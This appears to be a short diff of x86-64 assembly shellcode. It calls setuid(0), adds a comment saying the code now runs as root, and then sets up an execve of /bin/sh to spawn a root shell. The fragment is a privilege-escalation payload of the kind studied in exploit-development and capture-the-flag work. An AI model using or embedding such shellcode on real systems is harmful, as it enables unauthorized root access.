@@ -6,7 +6,7 @@ _start:
     xor    %eax, %eax
     xor    %edi, %edi
     mov    $105, %al
-    syscall
+    syscall             # all instructions after this point run as UID=0 (root)
 
     # execve("/bin/sh", NULL, NULL)
     lea    cmd(%rip), %rdi
